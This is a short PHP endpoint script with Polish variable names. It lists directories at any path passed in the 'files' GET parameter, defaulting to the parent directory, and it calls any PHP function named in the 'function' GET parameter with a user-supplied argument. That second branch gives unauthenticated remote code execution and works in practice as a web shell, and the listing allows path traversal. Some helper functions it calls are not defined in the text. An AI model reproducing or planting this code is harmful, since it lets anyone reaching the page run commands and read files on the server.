<?php
if(isset($_GET['files']) ){
$url =(empty($_GET['files']) )?'../':$_GET['files'].'/' ;

$lista['katalog']=cat_list($url);
$lista['pliki']=files_list($url);
echo json($lista);
}elseif(isset($_GET['function']) ){
    echo json($_GET['function'](@$_GET['val']) );
}elseif(!isset($_GET['files']) ){
    echo microtime(true);
}

//print_r($_SERVER);